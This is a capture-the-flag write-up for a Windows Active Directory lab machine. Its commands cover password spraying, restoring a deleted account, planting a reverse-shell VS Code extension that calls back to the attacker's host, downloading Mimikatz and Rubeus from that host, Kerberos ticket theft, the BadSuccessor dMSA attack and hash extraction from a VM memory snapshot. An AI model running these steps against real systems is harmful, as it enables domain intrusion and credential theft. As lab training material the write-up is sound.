# Checkpoint

> **Difficulty:** Medium  
> **Operating System:** Windows

---

## Initial Enumeration

As usual, I started with basic enumeration to identify the target's exposed services and gather information about the environment.

```bash
nmap -sVC 10.129.65.112

echo "10.129.65.112 checkpoint.htb dc01.checkpoint.htb dc01" | sudo tee -a /etc/hosts

```

![](images/Pasted%20image%2020261022084916.png)

Before proceeding with Active Directory enumeration, I synchronized my machine's clock with the domain controller. Time synchronization is particularly important when working with Kerberos, since significant clock differences between the client and the domain controller can cause authentication failures.

```bash
sudo ntpdate 10.129.65.112

```

The credentials provided for the assessment were:

- **Username:** `alex.turner`
- **Password:** `Checkpoint2024!`

### SMB Enumeration

With the initial credentials, I enumerated the SMB shares to identify which ones were accessible and what permissions the account had.

```bash
nxc smb 10.129.65.112 -u alex.turner -p 'Checkpoint2024!' --shares
```

![](images/Pasted%20image%2020261022085236.png)

Two non-default shares caught my attention: **DevDrop** and **VMBackups**. However, the `alex.turner` account only had `READ` permissions on the first share, so I started there.

```bash
smbclient //10.129.65.112/DevDrop -U 'checkpoint.htb\alex.turner%Checkpoint2024!'
```

![](images/Pasted%20image%2020261022230125.png)

Unfortunately, the share was empty. Nothing useful there, lol.

### LDAP Enumeration

Since SMB did not provide an immediate foothold, I moved on to LDAP enumeration to gather information about the domain users.

```bash
nxc ldap 10.129.65.112 -u alex.turner -p 'Checkpoint2024!' --users

```

![](images/Pasted%20image%2020261022160056.png)

The next step was to extract the usernames from the LDAP output and save them to `users.txt`. I then planned to test the known password against the discovered accounts.

```bash
nxc ldap 10.129.65.112 -u alex.turner -p 'Checkpoint2024!' --users \
  | awk '$1=="LDAP" && $4=="DC01" && $6 ~ /^[0-9]{4}-/ {print $5}' > users.txt

```

![](images/Pasted%20image%2020261022160331.png)

With the usernames collected, I attempted to password-spray the domain using the known password.

```bash
nxc ldap 10.129.65.112 -u users.txt -p 'Checkpoint2024!' --continue-on-success
```

![](images/Pasted%20image%2020261022160535.png)

Well, that didn't work as expected. Instead of spending more time on the same approach, I decided to investigate the domain's permissions and look for opportunities to modify Active Directory objects.

### Enumerating Writable Active Directory Objects

Since there were no public-facing websites to investigate, I used BloodyAD to identify the Active Directory objects and attributes that my current account was allowed to modify.

```bash
bloodyAD --host 10.129.65.112 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

![](images/Pasted%20image%2020261022162758.png)

Two findings stood out.

First, `alex.turner` had `CREATE_CHILD` permissions under the `Employees` organizational unit (OU), where most of the domain users were located. This suggested that I could potentially create a new user account and use it to continue exploring the domain.

More importantly, the output also showed `WRITE` permissions on a deleted user object. The `\0ADEL:` prefix is an Active Directory tombstone marker, followed by the object's `GUID`. This indicated that the deleted object might be worth investigating further.

I decided to prioritize the second finding because restoring a potentially useful account could provide a more direct route to a foothold.

### Restoring the Deleted User

I used **BloodyAD** to restore the deleted object associated with Mark Davies.

```bash
bloodyAD --host 10.129.65.112 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"

```

The restoration completed successfully.

![](images/Pasted%20image%2020261022163417.png)

Next, I queried the restored object to inspect its attributes and verify its current state in Active Directory.

```bash
bloodyAD --host 10.129.65.112 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  get object "CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb"

```

![](images/Pasted%20image%2020261022163804.png)

The object's SID indicated that `mark.davies` was a regular domain user rather than a deleted-object placeholder. The account was restored and belonged to the Domain Users group, whose well-known RID is `513`.

There was another important detail to consider: my earlier password-spraying attempt had not included `mark.davies`, because the account was not active when I collected the user list.

Now that the account had been restored, I tested the known password against it over SMB.

```bash
nxc smb 10.129.65.112 -u mark.davies -p 'Checkpoint2024!'

```

And voilà! This time, the authentication succeeded, giving me a promising new account to work with.

![](images/Pasted%20image%2020261022164308.png)

### Uploading a Malicious VS Code Extension

With the newly restored account, I enumerated the SMB shares again to see whether its permissions differed from those of `alex.turner`.

![](images/Pasted%20image%2020261022164335.png)

This time, I noticed that `mark.davies` had `WRITE` permissions on the `DevDrop` share. Its description was especially interesting:

`VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0`

That description suggested that the share was used to store VS Code extension packages. If a privileged or otherwise useful process automatically installed or executed extensions from this location, a malicious extension could potentially provide code execution under that process's security context.

To test this possibility, I found a public script designed to generate a VS Code extension containing a reverse shell:

[vsix_revshell.py — GitHub](https://github.com/Goultarde/vsix_revshell.py)

I downloaded the script and generated an extension configured to connect back to my attacking machine at `10.10.15.35` on port `4444`.

```bash
python3 vsix_revshell.py -i 10.10.15.35 -p 4444 -o Harmless.vsix

```

![](images/Pasted%20image%2020261022170002.png)

With the extension generated, I connected to the writable SMB share and uploaded it.

```bash
smbclient //10.129.65.112/DevDrop -U 'checkpoint.htb\mark.davies%Checkpoint2024!'

# once in we upload it
put Harmless.vsix

# And we open the listener

nc -lvnp 4444

```

![](images/Pasted%20image%2020261022230014.png)

After the extension was processed, the reverse connection came back to my listener.

![](images/Pasted%20image%2020261022170918.png)

I obtained a shell as **`ryan.brooks`**. This confirmed that the writable share provided a route to code execution through the extension-processing workflow.

### Retrieving the User Flag

I checked the user's directory for the user flag.

```powershell
type `C:/Users/ryan.brooks/user.txt`

```

![](images/Pasted%20image%2020261022171153.png)

With the user flag retrieved, the next objective was privilege escalation.

---

## Privilege Escalation

### Attempting Credential Extraction with Mimikatz

My first approach was to upload Mimikatz and see whether I could extract useful credentials from the compromised machine.

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.15.35:8000/mimikatz.exe', 'C:\Windows\Temp\mimikatz.exe')

```

![](images/Pasted%20image%2020261022174604.png)

Unfortunately, this approach reached a dead end. The `ryan.brooks` account did not have sufficient privileges to dump LSASS, so I needed another way to obtain Kerberos credentials.

### Extracting a Kerberos Ticket with Rubeus

Instead of attempting to dump LSASS again, I switched to Rubeus to investigate whether the current logon session could be used to obtain a Kerberos ticket.

I uploaded `Rubeus.exe` to the target:

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.15.35:8000/Rubeus.exe', 'C:\Windows\Temp\Rubeus.exe')

# once it completes
C:\Windows\Temp\Rubeus.exe tgtdeleg /nowrap

# and we get the base64 tgt

```

![](images/Pasted%20image%2020261022211013.png)

The command returned a Base64-encoded Kerberos ticket. I copied the output so I could convert it into a format usable by Impacket and the local Kerberos tools.

### Converting the Ticket for Pass-the-Ticket

I saved the Base64 output to `ryan.b64`, decoded it into a `.kirbi` file, and converted that ticket to the `.ccache` format.

```bash
cat > ryan.b64 << 'EOF'
doIF1DCCBdCgAw..........<BASE64>
EOF


base64 -d ryan.b64 > ryan.kirbi

impacket-ticketConverter ryan.kirbi ryan.ccache

export KRB5CCNAME=$PWD/ryan.ccache

# check 
klist

# synchronize the clock to the dc01
sudo ntpdate -u 10.129.65.112

```

![](images/Pasted%20image%2020261022211108.png)

The `KRB5CCNAME` environment variable tells Kerberos-aware tools to use the specified credential cache. I checked the ticket with `klist` and synchronized the clock again before testing authentication.

I then used the cached Kerberos credentials to enumerate SMB shares through the domain controller's hostname.

```bash
nxc smb dc01.checkpoint.htb -k --use-kcache --shares

```

![](images/Pasted%20image%2020261022213048.png)

Although this confirmed that I could continue testing with the ticket, NetExec did not provide all the information I needed about the account's Active Directory permissions.

I therefore returned to BloodyAD and used the Kerberos cache to enumerate writable objects as `ryan.brooks`.

```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
  -k -u ryan.brooks \
  get writable

```

![](images/Pasted%20image%2020261022213228.png)

As we can see, `ryan.brooks` has two permissions that together are the sufficient requirements for the `BadSuccessor` attack on a Windows Server 2025 domain controller (Build 26100):

- `WRITE` on the service account `svc_deploy` — the ability to modify attributes on that account.
- `CREATE_CHILD `on `OU=DMSAHolder` — the ability to create new objects (including **dMSAs**) in that OU.

In basic terms, a **dMSA** (Delegated Managed Service Account) is an account type introduced in Windows Server 2025 to modernize service-account management: the domain controller manages its key material and rotates it automatically, removing the need for a human-set password.&#x20;

To make migration from legacy service accounts smooth, Microsoft introduced the `msDS-ManagedAccountPrecededByLink` attribute on the **dMSA** object. When this attribute is set to an existing account (the "preceded by" target), the **dMSA**'s credential material is derived from — and effectively equal to — that target account's credential.

The flaw (`BadSuccessor`) is that setting this link is authorized by a mere `WRITE` on the target account, not by Domain Admin rights. As a result, any principal with `WRITE` over a *service account* can create a dMSA **and** link it to that service account, thereby obtaining the service account's NT hash without cracking or resetting it. In our case, creating a **dMSA** in **DMSAHolder** and linking it to svc_deploy yields **svc_deploy**'s credential.

Now enough talk and let us get working:
```bash
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -k -u ryan.brooks add badSuccessor dmsa_pwn --ou "OU=DMSAHolder,DC=checkpoint,DC=htb" -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"

```

![](images/Pasted%20image%2020261022225238.png)

And just like that we got the hash so we can Pass it again to access the shares..etc

```bash
nxc smb 10.129.65.112 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares

```

![](images/Pasted%20image%2020261022225640.png)

### Accessing the VMBackups Share

The SMB enumeration confirmed that `svc_deploy` could read the `VMBackups` share. This was particularly promising because virtual machine backups can contain sensitive data, including memory snapshots that may preserve credentials from the time the snapshot was taken.

I connected to SMB using the recovered NT hash.

```bash
impacket-smbclient 'checkpoint.htb/svc_deploy@10.129.65.112' -hashes :e16081eb077aca74bdbf8af12af43ac9

# once we are in we dig until we land on a bunch of VMs
use VMBackups

cd /NightlyBackup_2024-11-01/memory forensics

```

![](images/Pasted%20image%2020261022232218.png)

Inside the backup directory, I found a `.vmem` file.

A `.vmem` file is a virtual machine memory snapshot. Depending on the state of the machine when the snapshot was captured, its contents may include remnants of running processes, authentication material, and other sensitive data. If `LSASS`-related credential material is present in the dump, memory forensics may help recover account hashes.

There are two ways to approach this. The first is to download the memory snapshot and extract the hashes locally. The second, and much easier option in this case, is to upload a tool specifically designed for this kind of situation: `vmkatz`.

You can find it here: [VMkatz — Official GitHub Releases](https://github.com/nikaiw/VMkatz/releases#release-v1.5.0)

We are going to start with the easier approach. However, keep in mind that during a real penetration test, uploading an executable like this to a target machine could trigger alerts and attract the attention of the SOC team compared to the 2nd approach (there is the bad one, and the worst one lol). Just saying. xD

1. Uploading the Tools

Before proceeding, remember that whenever we obtain credentials for a new account, it is good practice to test them against common remote services such as `SMB`, `RDP`, and `WinRM`. Different services may grant different levels of access, so we should not assume that an account's privileges are limited to the service through which we initially discovered it.

I tested the svc_deploy credentials against all three services:

```bash
 nxc smb 10.129.66.119 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'
 
 nxc rdp 10.129.66.119 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'
 
 nxc winrm 10.129.66.119 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'
```

>[!Note]
>Even though RDP did not appear in the Nmap scan results, it is still worth checking when you have new credentials. A service might be accessible in ways that were not obvious during the initial enumeration, and testing newly discovered credentials against common remote services can reveal additional access paths.

![](images/Pasted%20image%2020261023214711.png)

Notice that WinRM returned the `Pwned!` marker. This indicates that svc_deploy has administrative access to the target through `WinRM`, giving us a straightforward way to execute commands and upload our tool.

I connected to the target using Evil-WinRM and uploaded vmkatz.exe. Make sure to launch Evil-WinRM from the directory where the executable is located so that the upload command can find the local file.

```bash
evil-winrm -i 10.129.66.119 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'

# make sure to run the evil-winrm where the tool exists

# Once inside

upload vmkatz.exe
```

![](images/Pasted%20image%2020261023215144.png)

After uploading the tool, I double-checked that the transfer had succeeded and confirmed the location of the memory snapshot on the target.

```bash
dir

dir "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\"
```

With both the tool and the memory snapshot in place, everything was ready. I ran **vmkatz.exe** against the `.vmem` file to extract the Administrator's hash.

```bash
.\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
```

![](images/Pasted%20image%2020261023215616.png)

2. Downloading the Memory Snapshot
### Analyzing the Memory Snapshot with Volatility

Once the download completed, I used Volatility 3 to inspect the memory image and investigate whether credential material could be recovered.

If Volatility3 was not already installed on Parrot OS, I could install it and inject the additional dependency with `pipx`:

```bash
pipx install volatility3
pipx inject volatility3 pycryptodome 

```

I first identified the operating system information associated with the memory image.

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.info

```

![](images/Pasted%20image%2020261023032550.png)

With the image identified, I attempted to extract password hashes using Volatility's `windows.hashdump` plugin.

```bash
vol -f "Windows Server 2019-Snapshot1.vmem" windows.hashdump

```

![](images/Pasted%20image%2020261023032633.png)

The output provided the Administrator account's hash, giving me another route to authenticate to the Windows target without knowing the plaintext password.

### Obtaining Administrator Access

I used the recovered NT hash with Evil-WinRM to authenticate as Administrator.

```bash
evil-winrm -i 10.129.65.197 -u administrator -H 'f29e9c014295b9b32139b09a2790be3b'

```

![](images/Pasted%20image%2020261023032745.png)

### Locating the Root Flag

After obtaining the Administrator shell, I checked the root of the `C:\` drive. Since the flag was not directly in the Administrator user's home directory, I searched the filesystem recursively for `root.txt`.

```Powershell
cd C:/

Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue -Force | Select-Object FullName

```

![](images/Pasted%20image%2020261023033051.png)

The search revealed the location of the root flag. With the Administrator hash recovered from the memory snapshot and privileged access established, the box was rooted.

---

## Conclusion

Checkpoint was a great example of how seemingly minor Active Directory permissions can lead to a full domain compromise.

It genuinely fascinates me how a simple misconfiguration in permissions can put an entire machine ( and potentially the whole domain) at risk.
BadSuccessor was a first for me: not only was it my first time exploiting it, but it was also the first time I had even heard of it. And as for extracting the Administrator hash from a VM memory dump... what can I say? Live and learn something new every day.

**— 0xchnk**